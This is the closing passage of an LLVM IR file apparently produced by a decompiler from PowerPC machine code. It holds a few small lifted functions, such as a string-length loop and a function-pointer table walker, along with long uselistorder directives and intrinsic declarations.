  uselistorder i32* @r28, { 2, 22, 23, 24, 25, 26, 27, 32, 33, 28, 29, 30, 31, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 12, 3, 11, 13, 14, 15, 16, 17, 18, 44, 48, 45, 46, 47, 1, 83, 84, 51, 52, 118, 119, 85, 4, 86, 87, 88, 89, 90, 5, 120, 121, 122, 123, 130, 78, 79, 80, 81, 82, 53, 54, 124, 125, 126, 127, 128, 49, 50, 91, 92, 55, 6, 56, 57, 58, 59, 60, 61, 62, 63, 93, 94, 95, 7, 96, 97, 8, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 0, 114, 115, 19, 20, 21, 129, 64, 65, 66, 67, 9, 68, 10, 69, 70, 71, 72, 73, 74, 75, 116, 117, 76, 77 }
  uselistorder i32 23, { 0, 4, 5, 6, 1, 2, 3 }
  uselistorder i32 18, { 1, 0, 2, 3, 4 }
  uselistorder i32 8, { 48, 49, 50, 51, 52, 53, 20, 21, 54, 55, 56, 57, 58, 59, 25, 26, 22, 15, 17, 18, 27, 28, 29, 30, 31, 60, 67, 68, 69, 19, 90, 61, 0, 70, 91, 92, 93, 94, 95, 96, 97, 98, 12, 99, 100, 101, 123, 124, 131, 134, 10, 37, 38, 13, 32, 14, 39, 79, 33, 83, 82, 80, 81, 84, 85, 86, 87, 88, 89, 1, 62, 63, 64, 23, 45, 46, 16, 47, 128, 129, 130, 2, 135, 3, 132, 133, 65, 71, 72, 73, 34, 102, 103, 104, 105, 106, 24, 107, 108, 109, 110, 4, 5, 111, 112, 11, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 9, 6, 125, 126, 127, 74, 75, 76, 77, 35, 36, 78, 7, 8, 40, 41, 42, 43, 44, 66 }
  uselistorder i32* @r30, { 32, 33, 34, 8, 35, 37, 39, 40, 41, 42, 43, 36, 38, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 20, 21, 22, 1, 23, 24, 25, 7, 26, 27, 58, 55, 56, 5, 57, 4, 103, 104, 105, 9, 106, 107, 108, 59, 60, 61, 62, 63, 64, 65, 18, 66, 67, 68, 69, 70, 71, 72, 73, 109, 110, 111, 112, 113, 10, 114, 115, 116, 117, 118, 11, 142, 143, 144, 145, 12, 96, 146, 157, 147, 148, 28, 0, 29, 13, 30, 31, 97, 98, 99, 100, 101, 102, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 149, 150, 151, 152, 153, 154, 155, 14, 156, 119, 120, 84, 15, 85, 86, 89, 87, 88, 90, 91, 93, 92, 6, 94, 121, 122, 123, 124, 125, 2, 127, 19, 128, 16, 129, 130, 126, 131, 132, 133, 134, 135, 136, 137, 17, 138, 139, 3, 140, 141, 95 }
  uselistorder i1 false, { 1, 2, 4, 5, 6, 7, 8, 0, 3, 9, 10 }
  uselistorder i32* @r31, { 74, 2, 7, 75, 6, 76, 77, 78, 8, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 47, 50, 9, 41, 10, 11, 51, 52, 53, 93, 94, 95, 96, 1, 97, 98, 99, 100, 101, 102, 103, 104, 212, 213, 214, 215, 216, 135, 12, 136, 137, 138, 139, 13, 140, 141, 142, 143, 144, 145, 217, 218, 219, 220, 221, 222, 223, 224, 225, 14, 226, 15, 270, 271, 272, 16, 106, 105, 3, 108, 109, 110, 111, 112, 113, 114, 115, 61, 62, 63, 64, 146, 17, 147, 148, 18, 149, 150, 19, 151, 152, 227, 228, 229, 230, 231, 20, 232, 233, 234, 235, 21, 236, 22, 237, 238, 239, 46, 240, 0, 273, 274, 275, 23, 48, 276, 42, 199, 24, 200, 282, 283, 44, 69, 277, 280, 281, 72, 73, 54, 55, 56, 57, 58, 70, 71, 4, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 116, 117, 118, 26, 119, 120, 121, 25, 122, 123, 124, 125, 126, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 27, 107, 241, 242, 127, 128, 129, 29, 130, 28, 131, 153, 154, 155, 30, 156, 157, 158, 159, 160, 161, 162, 163, 31, 45, 164, 5, 165, 166, 132, 133, 134, 32, 167, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 35, 34, 260, 33, 264, 265, 36, 266, 267, 268, 269, 59, 60, 262, 261, 263, 278, 37, 279, 49, 38, 43, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 180, 179, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 65, 66, 67, 68, 194, 195, 196, 197, 39, 40, 198 }
  uselistorder i32* @r23, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 12, 11, 0, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* @r24, { 3, 4, 7, 5, 6, 8, 9, 10, 0, 11, 12, 13, 14, 15, 2, 16, 17, 18, 1, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* @r6, { 2, 3, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 4, 16, 1, 17, 5 }
  uselistorder i32* @r25, { 3, 4, 5, 7, 8, 6, 9, 1, 2, 10, 11, 12, 13, 14, 15, 16, 17, 18, 27, 30, 19, 20, 21, 22, 0, 23, 24, 25, 26, 28, 29 }
  uselistorder i32* @r26, { 1, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13, 15, 16, 17, 18, 19, 3, 4, 20, 21, 22, 23, 24, 2, 25, 26, 27, 28, 29, 30, 31, 32, 33, 49, 50, 72, 48, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 69, 51, 52, 53, 54, 55, 56, 58, 57, 59, 60, 61, 62, 63, 64, 65, 66, 0, 70, 71, 46, 67, 68, 47 }
  uselistorder i32 ()* @__asm_mfcr, { 27, 22, 18, 26, 25, 12, 17, 35, 11, 34, 9, 30, 8, 7, 6, 5, 4, 33, 3, 2, 1, 24, 29, 21, 32, 16, 15, 31, 10, 28, 23, 14, 36, 13, 19, 20, 0 }
  uselistorder label %dec_label_pc_1000cd70, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000cd60, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd48, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd44, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd34, { 1, 0 }
  uselistorder label %dec_label_pc_1000ccf0, { 1, 0 }
  uselistorder label %dec_label_pc_1000ccd8, { 1, 0 }
  uselistorder label %dec_label_pc_1000ccd0, { 1, 0 }
}

define i32 @function_1000cd8c() local_unnamed_addr {
dec_label_pc_1000cd8c:
  %r11.global-to-local = alloca i32, align 4
  %v0_1000cd8c = load i32, i32* @r3, align 4
  store i32 %v0_1000cd8c, i32* %r11.global-to-local, align 4
  %v3_1000cd8c = icmp eq i32 %v0_1000cd8c, 0
  %v0_1000cd94 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000cd8c, i32 %v0_1000cd94)
  %v0_1000cda4 = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000cdb0

dec_label_pc_1000cd9c:                            ; preds = %dec_label_pc_1000cdac
  %v1_1000cd9c = add i32 %v1_1000cdb0, 2
  br label %dec_label_pc_1000cdcc

dec_label_pc_1000cdac:                            ; preds = %dec_label_pc_1000cdb0
  %v2_1000cdc4 = add i32 %v1_1000cdb4, %v5_1000cdb0
  %v3_1000cdc0 = icmp eq i32 %v1_1000cdbc, 192
  br i1 %v3_1000cdc0, label %dec_label_pc_1000cd9c, label %dec_label_pc_1000cdb0

dec_label_pc_1000cdb0:                            ; preds = %dec_label_pc_1000cdac, %dec_label_pc_1000cd8c
  %v1_1000cdb0 = phi i32 [ %v2_1000cdc4, %dec_label_pc_1000cdac ], [ %v0_1000cda4, %dec_label_pc_1000cd8c ]
  %v0_1000cdb0 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000cdb0 = add i32 %v0_1000cdb0, %v1_1000cdb0
  %v3_1000cdb0 = inttoptr i32 %v2_1000cdb0 to i8*
  %v4_1000cdb0 = load i8, i8* %v3_1000cdb0, align 1
  %v5_1000cdb0 = zext i8 %v4_1000cdb0 to i32
  %v1_1000cdb4 = add i32 %v1_1000cdb0, 1
  %v3_1000cdb8 = icmp eq i8 %v4_1000cdb0, 0
  %v1_1000cdbc = call i32 @__asm_rlwinm(i32 %v5_1000cdb0, i32 0, i32 24, i32 25)
  br i1 %v3_1000cdb8, label %dec_label_pc_1000cdcc, label %dec_label_pc_1000cdac

dec_label_pc_1000cdcc:                            ; preds = %dec_label_pc_1000cdb0, %dec_label_pc_1000cd9c
  %v1_1000cdcc = phi i32 [ %v1_1000cd9c, %dec_label_pc_1000cd9c ], [ %v1_1000cdb4, %dec_label_pc_1000cdb0 ]
  %v0_1000cdcc = load i32, i32* @r4, align 4
  %v2_1000cdcc = sub i32 %v1_1000cdcc, %v0_1000cdcc
  ret i32 %v2_1000cdcc

; uselistorder directives
  uselistorder i32 %v1_1000cdb4, { 1, 0 }
  uselistorder i32 %v5_1000cdb0, { 1, 0 }
  uselistorder i32 %v1_1000cdb0, { 2, 1, 0 }
  uselistorder i32 %v0_1000cd8c, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm, { 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 0, 60, 2, 33, 43, 44, 45, 3, 61, 62, 41, 42, 17, 18, 19, 63, 64, 65, 46, 31, 34, 35, 1, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 36, 37, 38, 39, 40, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 66 }
  uselistorder i32 25, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 24, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 20, 29, 16, 17, 18, 21, 22, 23, 30, 0, 28, 1, 31, 19, 24, 25, 26, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 27, 2, 3, 4, 5, 6 }
  uselistorder i8 0, { 32, 30, 3, 33, 1, 34, 35, 4, 5, 6, 7, 8, 25, 39, 37, 24, 38, 36, 23, 40, 41, 42, 43, 9, 45, 44, 26, 10, 46, 47, 11, 48, 49, 12, 22, 28, 52, 50, 51, 27, 53, 54, 13, 56, 55, 29, 57, 58, 0, 59, 60, 61, 62, 14, 63, 65, 66, 67, 68, 64, 69, 15, 70, 71, 72, 73, 16, 17, 18, 19, 20, 75, 76, 77, 78, 74, 79, 2, 80, 82, 81, 21, 83, 84, 85, 86, 87, 88, 91, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 112, 111, 31, 113, 114, 115 }
  uselistorder i32 192, { 0, 1, 3, 2 }
  uselistorder i32 2, { 0, 31, 4, 88, 51, 89, 90, 32, 1, 2, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 5, 103, 6, 79, 80, 81, 33, 30, 104, 105, 106, 107, 108, 52, 53, 54, 117, 118, 135, 43, 7, 8, 3, 55, 109, 9, 10, 34, 112, 113, 42, 119, 120, 11, 121, 122, 123, 136, 56, 57, 82, 58, 83, 59, 84, 137, 35, 12, 13, 14, 46, 49, 50, 60, 61, 110, 47, 15, 36, 138, 16, 17, 37, 38, 39, 62, 41, 40, 124, 125, 114, 115, 126, 127, 128, 18, 19, 20, 21, 22, 129, 130, 23, 132, 133, 134, 29, 131, 116, 63, 24, 139, 26, 25, 48, 65, 64, 67, 66, 69, 68, 85, 44, 71, 45, 86, 70, 87, 73, 72, 111, 27, 28, 75, 74, 76, 77, 78 }
  uselistorder i32* @r4, { 28, 29, 1, 30, 31, 32, 33, 2, 34, 35, 36, 37, 9, 10, 38, 39, 40, 41, 42, 43, 44, 45, 3, 74, 99, 100, 46, 47, 49, 50, 51, 6, 52, 53, 54, 55, 56, 14, 11, 75, 76, 77, 78, 79, 80, 81, 82, 83, 110, 8, 7, 102, 13, 24, 25, 57, 58, 64, 65, 103, 104, 105, 48, 4, 84, 85, 86, 12, 87, 88, 59, 60, 61, 62, 63, 66, 67, 68, 5, 109, 89, 69, 90, 91, 92, 0, 93, 94, 95, 101, 96, 97, 23, 98, 106, 107, 108, 15, 16, 17, 18, 19, 20, 21, 22, 26, 27, 70, 71, 72, 73 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 14, 24, 11, 1, 16, 17, 18, 19, 20, 25, 15, 21, 12, 13, 27, 26, 22, 23 }
}

define i32 @function_1000cdd4(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000cdd4:
  %r31.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r31.global-to-local, align 4
  %v3_1000cdf0 = load i32, i32* @global_var_10010000.2, align 4
  %v3_1000cdf4 = icmp eq i32 %v3_1000cdf0, -1
  br i1 %v3_1000cdf4, label %dec_label_pc_1000ce10, label %dec_label_pc_1000cdfc

dec_label_pc_1000cdfc:                            ; preds = %dec_label_pc_1000cdd4, %dec_label_pc_1000cdfc
  %v0_1000cdfc = phi i32 [ %v3_1000ce04, %dec_label_pc_1000cdfc ], [ %v3_1000cdf0, %dec_label_pc_1000cdd4 ]
  call void @__pseudo_call(i32 %v0_1000cdfc)
  %v0_1000ce04 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000ce04 = add i32 %v0_1000ce04, -4
  %v2_1000ce04 = inttoptr i32 %v1_1000ce04 to i32*
  %v3_1000ce04 = load i32, i32* %v2_1000ce04, align 4
  store i32 %v1_1000ce04, i32* %r31.global-to-local, align 4
  %v3_1000ce08 = icmp eq i32 %v3_1000ce04, -1
  br i1 %v3_1000ce08, label %dec_label_pc_1000ce10, label %dec_label_pc_1000cdfc

dec_label_pc_1000ce10:                            ; preds = %dec_label_pc_1000cdfc, %dec_label_pc_1000cdd4
  %v0_1000ce20 = load i32, i32* @r3, align 4
  ret i32 %v0_1000ce20

; uselistorder directives
  uselistorder i32 %v3_1000ce04, { 1, 0 }
  uselistorder i32 -4, { 2, 16, 17, 18, 9, 10, 11, 12, 13, 19, 20, 3, 4, 5, 6, 15, 14, 28, 29, 25, 26, 27, 21, 22, 23, 24, 7, 8, 0, 1 }
  uselistorder void (i32)* @__pseudo_call, { 1, 3, 4, 5, 2, 0 }
  uselistorder i32 -1, { 199, 200, 16, 46, 57, 230, 231, 58, 286, 123, 232, 59, 233, 50, 60, 234, 61, 235, 201, 202, 111, 112, 63, 62, 203, 47, 48, 204, 205, 206, 161, 69, 67, 65, 207, 208, 209, 68, 66, 64, 210, 211, 162, 212, 163, 236, 26, 27, 164, 237, 165, 51, 271, 70, 287, 124, 3, 4, 288, 289, 52, 290, 291, 71, 72, 0, 166, 329, 30, 31, 32, 330, 167, 334, 28, 29, 213, 333, 220, 238, 33, 239, 240, 241, 127, 242, 243, 244, 245, 246, 247, 248, 125, 249, 126, 250, 251, 252, 253, 168, 292, 169, 53, 5, 170, 293, 294, 171, 172, 173, 295, 174, 254, 255, 34, 35, 36, 175, 256, 257, 176, 272, 273, 274, 49, 296, 297, 298, 121, 54, 299, 300, 301, 302, 128, 303, 6, 73, 304, 305, 306, 307, 308, 177, 309, 129, 310, 311, 130, 7, 8, 131, 55, 312, 178, 218, 179, 313, 314, 315, 316, 74, 75, 331, 332, 76, 282, 132, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 335, 88, 337, 336, 89, 221, 222, 133, 180, 223, 39, 40, 181, 224, 37, 38, 182, 227, 9, 134, 214, 10, 90, 56, 225, 41, 42, 183, 135, 113, 226, 91, 215, 283, 284, 45, 184, 258, 114, 259, 260, 136, 264, 92, 93, 228, 338, 339, 317, 94, 185, 186, 261, 262, 187, 263, 188, 189, 119, 190, 191, 192, 193, 194, 43, 195, 137, 95, 96, 265, 266, 267, 275, 115, 276, 277, 278, 17, 18, 19, 20, 21, 22, 23, 116, 117, 318, 15, 319, 11, 320, 321, 196, 138, 24, 197, 322, 323, 1, 325, 326, 2, 139, 140, 198, 44, 141, 122, 327, 142, 324, 279, 12, 25, 118, 143, 13, 219, 328, 144, 280, 145, 281, 146, 97, 98, 99, 100, 101, 102, 103, 104, 105, 340, 216, 217, 147, 148, 149, 150, 151, 106, 152, 229, 107, 153, 154, 268, 110, 109, 108, 269, 155, 270, 156, 157, 158, 159, 14, 120, 285, 160 }
  uselistorder i32 ptrtoint (i32* @global_var_10010000.2 to i32), { 51, 52, 53, 54, 55, 56, 1, 57, 58, 59, 37, 38, 2, 60, 4, 3, 39, 5, 61, 40, 62, 41, 63, 64, 65, 66, 67, 0, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 42, 43, 44, 8, 6, 7, 45, 9, 10, 11, 12, 13, 14, 15, 80, 81, 82, 17, 83, 84, 16, 85, 21, 20, 18, 19, 46, 24, 23, 22, 27, 25, 26, 28, 47, 33, 29, 30, 48, 31, 32, 34, 35, 36, 49, 50 }
  uselistorder i32 1, { 178, 742, 339, 743, 744, 745, 746, 747, 748, 152, 150, 151, 749, 459, 750, 751, 249, 250, 248, 251, 403, 752, 256, 291, 509, 242, 243, 753, 399, 754, 404, 757, 758, 759, 760, 761, 460, 762, 763, 764, 100, 99, 104, 103, 102, 101, 105, 98, 106, 765, 766, 767, 510, 73, 76, 74, 72, 75, 77, 768, 78, 79, 769, 67, 770, 92, 90, 89, 91, 392, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 512, 511, 185, 184, 183, 186, 187, 188, 681, 682, 683, 684, 513, 507, 171, 162, 172, 161, 167, 168, 169, 166, 164, 165, 163, 170, 173, 412, 771, 772, 395, 773, 774, 775, 776, 777, 778, 514, 128, 127, 129, 126, 130, 450, 782, 779, 780, 781, 515, 334, 332, 331, 328, 330, 333, 335, 327, 326, 329, 325, 324, 686, 687, 688, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 31, 28, 29, 26, 33, 27, 30, 32, 800, 799, 405, 689, 294, 134, 252, 292, 406, 883, 97, 94, 95, 93, 96, 82, 884, 517, 516, 84, 83, 85, 241, 381, 950, 461, 462, 519, 518, 198, 194, 197, 196, 193, 195, 0, 463, 522, 521, 520, 80, 81, 523, 524, 801, 393, 802, 804, 805, 806, 807, 808, 526, 525, 340, 341, 342, 343, 809, 810, 811, 388, 812, 813, 413, 814, 815, 431, 432, 464, 414, 427, 816, 466, 436, 817, 818, 467, 819, 820, 821, 465, 532, 531, 530, 529, 500, 528, 527, 317, 316, 311, 313, 314, 310, 315, 312, 318, 1, 822, 823, 824, 825, 415, 71, 690, 691, 50, 51, 692, 216, 215, 214, 213, 217, 885, 264, 265, 266, 269, 268, 267, 886, 887, 468, 888, 244, 246, 245, 301, 302, 297, 300, 299, 298, 469, 861, 862, 501, 48, 47, 49, 472, 889, 890, 891, 470, 892, 471, 893, 894, 895, 896, 897, 543, 542, 541, 540, 539, 538, 537, 536, 535, 534, 502, 533, 284, 281, 283, 280, 276, 282, 289, 285, 279, 286, 275, 278, 290, 277, 288, 287, 274, 273, 272, 898, 451, 8, 11, 10, 9, 7, 3, 4, 6, 5, 132, 131, 133, 951, 952, 69, 70, 68, 899, 900, 544, 355, 352, 354, 356, 357, 353, 416, 901, 547, 546, 545, 240, 247, 218, 548, 258, 189, 263, 293, 387, 382, 222, 257, 199, 549, 270, 550, 236, 179, 473, 551, 38, 474, 438, 437, 716, 555, 554, 553, 552, 210, 209, 206, 207, 211, 208, 212, 953, 558, 557, 556, 145, 144, 146, 143, 954, 559, 723, 724, 725, 452, 726, 417, 41, 43, 45, 40, 42, 39, 44, 46, 685, 159, 155, 153, 157, 154, 158, 156, 160, 717, 418, 718, 560, 346, 345, 344, 347, 348, 349, 350, 36, 35, 37, 34, 139, 135, 138, 137, 140, 142, 136, 141, 561, 562, 563, 149, 565, 564, 190, 191, 192, 238, 239, 237, 400, 880, 566, 147, 148, 439, 567, 568, 569, 570, 571, 572, 573, 574, 453, 454, 826, 419, 475, 827, 828, 440, 838, 577, 576, 575, 118, 116, 117, 115, 119, 114, 112, 113, 120, 111, 121, 122, 578, 579, 728, 729, 730, 731, 732, 733, 231, 232, 234, 235, 227, 226, 225, 233, 230, 228, 229, 224, 955, 581, 580, 386, 583, 582, 124, 123, 125, 584, 803, 755, 756, 902, 903, 585, 358, 360, 359, 361, 407, 904, 829, 830, 831, 832, 833, 834, 835, 836, 837, 303, 304, 307, 305, 306, 308, 841, 839, 840, 843, 842, 905, 906, 907, 844, 396, 88, 87, 86, 963, 964, 261, 259, 262, 260, 959, 960, 961, 962, 385, 384, 383, 12, 476, 845, 846, 847, 503, 14, 13, 15, 441, 863, 864, 865, 428, 408, 110, 109, 108, 866, 586, 107, 420, 477, 867, 588, 587, 848, 849, 589, 255, 254, 253, 590, 204, 205, 203, 202, 591, 176, 175, 908, 909, 479, 910, 911, 912, 913, 914, 915, 917, 918, 919, 480, 920, 921, 421, 922, 478, 923, 481, 924, 925, 926, 916, 595, 594, 593, 592, 61, 59, 56, 60, 54, 52, 53, 55, 57, 62, 58, 927, 928, 929, 930, 931, 365, 366, 362, 363, 364, 367, 368, 482, 319, 320, 932, 933, 65, 64, 66, 63, 935, 422, 936, 401, 423, 938, 939, 940, 941, 424, 943, 425, 942, 937, 504, 602, 601, 600, 599, 598, 597, 596, 372, 373, 376, 378, 369, 377, 375, 370, 374, 379, 371, 409, 410, 180, 181, 182, 934, 442, 505, 483, 221, 220, 219, 957, 443, 958, 868, 869, 870, 871, 872, 873, 411, 604, 603, 19, 17, 20, 18, 444, 606, 605, 23, 21, 24, 22, 608, 607, 177, 610, 609, 337, 338, 336, 612, 611, 874, 875, 614, 613, 25, 296, 309, 271, 174, 323, 380, 351, 223, 956, 615, 321, 693, 694, 695, 696, 697, 698, 486, 433, 699, 700, 391, 484, 485, 487, 701, 488, 702, 703, 389, 426, 621, 620, 619, 618, 617, 616, 489, 445, 446, 447, 490, 491, 624, 623, 622, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 626, 625, 506, 16, 719, 720, 633, 632, 631, 630, 629, 628, 627, 721, 722, 642, 641, 640, 639, 638, 637, 636, 635, 634, 727, 434, 646, 645, 644, 643, 492, 734, 402, 735, 736, 390, 737, 650, 649, 648, 647, 201, 200, 738, 739, 740, 741, 850, 851, 493, 852, 853, 854, 494, 398, 855, 495, 856, 657, 656, 655, 654, 653, 652, 651, 322, 429, 394, 857, 430, 448, 858, 496, 860, 397, 435, 859, 497, 498, 499, 665, 664, 663, 662, 661, 660, 659, 658, 876, 877, 666, 878, 879, 449, 881, 2, 882, 667, 456, 944, 945, 455, 946, 947, 457, 458, 948, 949, 669, 668, 295, 508 }
  uselistorder label %dec_label_pc_1000cdfc, { 1, 0 }
}

define i32 @function_1000ce24() local_unnamed_addr {
dec_label_pc_1000ce24:
  %v0_1000ce3c = load i32, i32* @r3, align 4
  ret i32 %v0_1000ce3c

; uselistorder directives
  uselistorder i32* @r3, { 28, 30, 125, 126, 129, 127, 128, 0, 130, 131, 13, 132, 14, 133, 53, 54, 55, 134, 135, 136, 15, 62, 63, 16, 34, 198, 199, 200, 197, 243, 244, 245, 137, 138, 139, 140, 141, 142, 143, 144, 145, 17, 146, 147, 148, 149, 150, 151, 152, 64, 65, 18, 66, 67, 68, 45, 201, 202, 203, 204, 205, 19, 153, 47, 32, 206, 207, 208, 209, 210, 211, 3, 2, 212, 213, 214, 38, 52, 257, 4, 41, 5, 46, 51, 251, 252, 253, 94, 95, 96, 97, 98, 99, 100, 101, 56, 57, 58, 59, 60, 193, 194, 154, 155, 156, 110, 111, 112, 113, 114, 115, 6, 33, 36, 254, 255, 50, 31, 7, 215, 216, 217, 218, 219, 42, 256, 37, 157, 158, 165, 166, 167, 168, 169, 170, 171, 35, 172, 173, 174, 175, 159, 160, 176, 177, 86, 87, 220, 39, 221, 222, 223, 8, 12, 9, 224, 10, 225, 11, 226, 227, 228, 229, 230, 231, 40, 232, 233, 234, 235, 236, 237, 61, 246, 247, 248, 249, 250, 178, 179, 180, 181, 182, 88, 89, 90, 49, 91, 92, 93, 238, 239, 240, 183, 184, 185, 186, 187, 188, 44, 69, 70, 71, 20, 72, 21, 73, 74, 75, 76, 77, 22, 78, 79, 26, 25, 80, 81, 82, 83, 24, 23, 84, 85, 102, 103, 104, 105, 106, 107, 108, 109, 116, 117, 118, 27, 119, 120, 121, 122, 123, 124, 161, 162, 163, 1, 164, 189, 190, 192, 191, 195, 196, 241, 242, 43, 29, 48 }
}

define i32 @function_1000ce40() local_unnamed_addr {
entry:
  store i32 268488272, i32* @lr, align 4
  %v0_1000ce4c = call i32 @function_100000b8()
  ret i32 %v0_1000ce4c

; uselistorder directives
  uselistorder i32 0, {}
  uselistorder i32* @lr, { 5, 148, 149, 150, 151, 152, 153, 154, 337, 409, 410, 411, 155, 159, 156, 157, 158, 163, 164, 160, 161, 162, 165, 166, 167, 168, 169, 6, 7, 8, 9, 10, 11, 170, 173, 171, 1, 172, 0, 174, 177, 178, 175, 176, 179, 180, 181, 182, 183, 184, 19, 338, 339, 280, 281, 282, 283, 340, 341, 342, 343, 322, 416, 417, 418, 419, 412, 413, 414, 415, 185, 186, 187, 193, 188, 189, 192, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 20, 21, 22, 23, 344, 345, 346, 420, 347, 348, 284, 285, 286, 287, 288, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 421, 422, 68, 69, 70, 361, 362, 323, 324, 423, 424, 433, 434, 437, 438, 439, 440, 441, 454, 456, 458, 435, 436, 88, 89, 90, 91, 92, 93, 94, 425, 431, 432, 12, 13, 95, 15, 96, 14, 16, 325, 327, 326, 328, 329, 330, 331, 332, 333, 266, 43, 132, 267, 268, 227, 269, 270, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 241, 242, 243, 244, 245, 442, 443, 444, 445, 446, 449, 450, 451, 190, 191, 363, 364, 365, 366, 239, 240, 457, 455, 367, 368, 369, 246, 247, 248, 249, 289, 290, 291, 292, 293, 250, 251, 294, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 17, 18, 384, 426, 427, 428, 429, 430, 452, 453, 295, 296, 297, 298, 299, 300, 301, 302, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 398, 399, 87, 303, 304, 305, 306, 402, 447, 448, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 50, 45, 46, 47, 48, 49, 2, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 271, 272, 273, 274, 275, 276, 277, 278, 279, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 334, 335, 336, 400, 401, 403, 404, 405, 406, 407, 408, 3, 4 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_mfcr() local_unnamed_addr

declare %1 @__asm_cror(i32, i32, i32) local_unnamed_addr

declare %0 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare %2 @__asm_mcrf_cr0_write(i4) local_unnamed_addr

declare i32 @unknown_0(i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr
